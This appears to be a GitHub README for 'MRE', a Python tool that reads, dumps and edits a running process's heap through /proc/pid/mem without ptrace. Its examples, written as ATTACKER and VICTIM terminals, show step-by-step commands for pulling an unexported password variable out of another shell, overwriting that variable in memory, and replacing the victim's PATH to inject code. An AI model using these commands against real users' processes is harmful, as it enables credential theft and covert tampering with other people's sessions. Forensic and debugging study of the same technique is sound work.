# MRE (Memory Retriever and Editor)
A comprehensive solution for retrieval and modification of memory from multiple Processes.

This scripts allows the user to:
- retrieve and edit memory from processes opened by the same user
- retrieve and edit memory from processes opened by other users (if launched as root)

It furthermore includes flags to list the exported environment variables and tries to list the unexported variables too.

This script does **NOT** depend on GDB or ptrace, and only uses the default python3 libs.

#
## How does it work?
The script works by accessing `/proc/{pid}/mem` directly without calling ptrace to lock the process, by seeking into the heap retrieving the address from `/proc/{pid}/maps`.

This allows complete heap dump and in-place edit, thus permitting environment manipulation and other fancy tricks.

#
## Usage

Requires: `python3` (uses f-strings)

You can execute it with: `python3 -BO mre.py`
```
usage: mre.py [-h] [-l] [-e] [-d] [-r OLDVAL NEWVAL] [-f REGF] [-x] PID

positional arguments:
  PID

options:
  -h, --help            show this help message and exit
  -l, --list            lists all the possible bash variables used by PID (even the unexported ones)
  -e, --environ         lists all the (exported) environment variables
  -d, --dumpheap        dumps heap memory to stdout
  -r OLDVAL NEWVAL, --replace OLDVAL NEWVAL
                        searches the heap (using regex) for OLDVAL and replaces it with NEWVAL (NEWVAL needs to be shorter or the same length as the        
                        computed current value)
  -f REGF, --filter REGF
                        used with -d, dumps only what matches the regex
  -x, --force           used with -r, forces replaces even in shorter strings (dangerous!)

MRE (Memory Retriever and Editor) v0.9 by ShotokanZH
```
#
## Examples
### Example 1: Local Variable Replace
**Terminal 1:**
```bash
VICTIM:~$ echo $$
269
VICTIM:~$ supersecretpass="snadoisthebesttool"
```
Here you can notice that Terminal 1 (PID: 269) set a local variable "`$supersecretpass`", valued "`snadoisthebesttool`".

Since the variable has not been exported, we have no way of retrieving the password from another terminal.

Or do we?

**Terminal 2:**
```bash
ATTACKER:~$ python3 -BO mre.py 269 -l  | grep --text "supersecretpass="
supersecretpass="snadoisthebesttool"
supersecretpass="snadoisthebesttool"
supersecretpass="snadoisthebesttool"
supersecretpass="snadoisthebesttool"
```

Ok, we have now retrieved the contents of `$supersecretpass`!

But, can we edit it?

First, we have to know that in the heap, variables are usually delimited with `\0`.

Let's search it!


**Terminal 2:**
```bash
ATTACKER:~$ python3 -BO mre.py 269 -d -f "\0snadoisthebesttool\0"
0x194d4f b'\x00snadoisthebesttool\x00'
```

Perfect, at heap address `0x194d4f` we have successfully matched our string!

Let's replace it:

**Terminal 2:**
```bash
ATTACKER:~$ python3 -BO mre.py 269 -r "\0snadoisthebesttool\0" "\0mreisgoodtoo"
FROM: b'\x00snadoisthebesttool\x00'
TO: b'\x00mreisgoodtoo\x00[*7]'
```

Let's see what happened in **Terminal 1:**

**Terminal 1:**
```bash
VICTIM:~$ echo $supersecretpass
mreisgoodtoo
```
#
### Example 1.1: PATH Replace
Let's try and replace a PATH, thus injecting code

**Terminal 1:**
```bash
VICTIM:~$ echo $PATH
/home/shotokan/.local/bin:/home/shotokan/perl5/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
```

Let's replace it, we have two ways of doing it:

**Terminal 2**
```bash
ATTACKER:~$ python3 -BO mre.py 269 -r "\0/home/shotokan/.local/bin:/home/shotokan/perl5/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games\0" '\0/snado'
FROM: b'\x00/home/shotokan/.local/bin:/home/shotokan/perl5/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games\x00'
TO: b'\x00snado\x00[*136]'
FROM: b'\x00/home/shotokan/.local/bin:/home/shotokan/perl5/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games\x00'    
TO: b'\x00snado\x00[*136]'
```
Or
```bash
ATTACKER:~$ python3 -BO mre.py 269 -r '\x00/home/shotokan/.local/bin:.*?\0' '\0/snado'
FROM: b'\x00/home/shotokan/.local/bin:/home/shotokan/perl5/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games\x00'
TO: b'\x00snado\x00[*136]'
FROM: b'\x00/home/shotokan/.local/bin:/home/shotokan/perl5/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games\x00'    
TO: b'\x00snado\x00[*136]'
```
(Yes, it supports REGEX!)

And congratulations, you successfully replaced the `$PATH` variable!

**Terminal 1**
```bash
VICTIM:~$ echo $PATH
snado
VICTIM:~$ ls
Command 'ls' is available in the following places
 * /bin/ls
 * /usr/bin/ls
The command could not be located because '/usr/bin:/bin' is not included in the PATH environment variable.
ls: command not found
```
#
### Example 2: Heap Dump
Want to dump the heap of a process?

It's as easy as:

```bash
ATTACKER:~$ python3 -BO mre.py 269 -d > out.bin
```

Done!
#
Want to offer me a coffee?

My Stellar address: `shotokanzh*keybase.io`

(git verified here: https://gist.github.com/d99a9a756149ec8f0403 )